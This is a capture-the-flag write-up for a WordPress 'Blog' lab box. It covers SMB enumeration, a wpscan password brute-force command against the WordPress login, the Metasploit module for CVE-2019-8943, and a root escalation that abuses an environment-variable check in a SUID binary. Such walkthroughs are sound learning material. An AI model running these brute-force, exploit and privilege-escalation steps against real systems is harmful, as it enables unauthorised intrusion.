# Objectives

Capture two flags from the box

# Steps

Since the task tells us to add blog.thm to the hosts file let’s do that before we start running anything on it.

# Enumeration

As always lets start with a basic portscan
	
```python
Nmap scan report for <IP>
Not shown: 998 closed ports
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have HTTP and SMB open. Let’s check out the SMB share

#SMB

Let’s scan the machine with smbmap to check for available shares
	
```
» smbmap.py -H <IP>
[+] Finding open SMB ports....
[+] Guest SMB session established on <IP>...
[+] IP: <IP>:445 Name: blog.thm
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        BillySMB                                                READ, WRITE     Billy's local SMB Share
        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
```

Let’s try to get the files from the BillySMB share as it’s the one that stands out
	
```
» smbclient //10.10.29.18/BillySMB
Try "help" to get a list of possible commands.
smb: \> dir

                15413192 blocks of size 1024. 9737512 blocks available
```
If we download the files we don’t see anything obvious. We can check the jpg with stegsolve

```
» steghide extract -sf Alice-White-Rabbit.jpg
Enter passphrase:
wrote extracted data to "rabbit_hole.txt".
» cat rabbit_hole.txt
```
You've found yourself in a rabbit hole, friend.

So since this is a rabbit hole let’s check out the HTTP server
HTTP

http index
When we visit the website we see a basic blog. From the room description we know it’s running wordpress.

With that we can scan it using wpscan (I’ll remove the unnecessary info)

```
» wpscan --url blog.thm -e u

```

We see the site is using WP version 5.0 and it found two users: kwheel and bjoel.

Room tags are hinting at a CVE (CVE-2019-8943) which is a vulnerability allowing for writing files with arbitrary paths thanks to path traversal in wp_crop_image().
If we read a bit more about this vuln we can find out that it requires a user account. Thankfully we got the two usernames here so let’s try bruteforcing at least one of them.

Since wpscan has a bruteforce feature we can use that.

```
» wpscan --url blog.thm -U kwheel,bjoel -P /opt/wordlists/rockyou.txt --password-attack wp-login -t 64
<RANDOM THINGS>

[SUCCESS] - kwheel / <REDACTED>
```

After around two minutes we succesfully gained a user account which we can now use to gain a shell.

# CVE-2019-8943 - metasploit

Metasploit contains a module that exploits this vulnerability which we can use to gain a shell.
exploit/multi/http/wp_crop_rce

# Shell

Now that we have a shell we can check for other users on the system

```
$ ls /home
bjoel
```

# Privesc

Looking through the system we can’t find a way to get to bjoel but we can see a suid binary that stands out a bit with it being in /usr/sbin

```
$ /usr/sbin/checker
Not an Admin
```
The program prints out a string but doesn’t seem like it does anything else so let’s check it with ghidra.

Ghidra decompiler shows us a program looking something like this (the code below has been cleaned up a bit)

```
int main(void) {
  char *adminEnv = getenv("admin");

  if (adminEnv == (char *)0x0) {
    puts("Not an Admin");
  } else {
    setuid(0);
    system("/bin/bash");
  }

  return 0;
}
```

We can see this program just gets the “admin” env variable and checks if it’s not null so we can easily bypass this by setting it to anything.

```
$ admin=a /usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Now we can read the root flag, check out the bjoel’s files and find his hidden user flag in /media

Thanks to:
